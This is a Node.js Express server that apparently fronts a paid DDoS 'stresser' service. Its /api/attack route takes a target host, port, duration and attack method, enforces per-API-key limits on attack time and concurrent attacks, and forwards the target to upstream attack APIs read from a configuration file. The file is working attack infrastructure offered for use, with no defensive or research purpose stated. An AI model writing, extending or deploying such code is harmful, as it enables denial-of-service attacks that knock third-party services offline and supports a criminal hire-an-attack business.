const express = require("express");
const axios = require("axios");
const fs = require("fs");
const app = express();

// Read configuration files
const allapis = JSON.parse(fs.readFileSync("apis.json"));
const apiKeys = JSON.parse(fs.readFileSync("api_keys.json"));

const activeAttacks = {};

// Middleware for JSON parsing
app.use(express.json());

// Root Route
app.get("/", (req, res) => {
  res.status(401).json({ error: true, message: "Unauthorized access." });
});

// API Attack Route
app.get("/api/attack", async (req, res) => {
  const { host, port, time, method, key: apiKey } = req.query;

  if (!(host && port && time && method && apiKey)) {
    return res.status(400).json({ error: true, message: "Missing parameters." });
  }

  const apiLimits = apiKeys[apiKey];

  if (!apiLimits) {
    return res.status(403).json({ error: true, message: "Invalid API key." });
  }

  if (apiLimits.maxAttackTime < parseInt(time)) {
    return res.status(400).json({ error: true, message: "Attack time exceeds limit." });
  }

  const currentTime = Date.now();
  const activeAttacksForApiKey = activeAttacks[apiKey] || [];
  const activeAttacksFiltered = activeAttacksForApiKey.filter(
    attack => currentTime - attack.startTime < attack.duration
  );

  if (apiLimits.maxConcurrentAttacks <= activeAttacksFiltered.length) {
    return res.status(429).json({ error: true, message: "Concurrent attacks limit exceeded." });
  }

  if (apiLimits.powersaving) {
    const existingAttack = activeAttacksFiltered.find(attack => attack.target === host);
    if (existingAttack) {
      return res.status(409).json({ error: true, message: "An attack on this target is already in progress." });
    }
  }
  
  activeAttacksForApiKey.push({
    startTime: currentTime,
    duration: parseInt(time) * 1000,
    target: host,
  });

  activeAttacks[apiKey] = activeAttacksForApiKey;

  if (!allapis[method]) {
    return res.status(400).json({ error: true, message: "Invalid method." });
  }

  const apiUrls = Array.isArray(allapis[method].api)
    ? allapis[method].api
    : [allapis[method].api];

  try {
    const attackPromises = apiUrls.map(apiUrl => {
      const replacedUrl = apiUrl
        .replace("<<$host>>", host)
        .replace("<<$port>>", port)
        .replace("<<$time>>", time);
      return axios.get(replacedUrl);
    });

    const attackResults = await Promise.all(attackPromises);
    res.status(200).json({ success: true, results: attackResults.map(r => r.data) });
  } catch (error) {
    res.status(500).json({ error: true, message: "Failed to send attack requests." });
  }
});

// Listen on port 5000
app.listen(5000, () => {
  console.log(`Server listening on port 5000`);
});

// Error handling
process.on("uncaughtException", err => console.error("Uncaught Exception:", err));
process.on("unhandledRejection", err => console.error("Unhandled Rejection:", err));
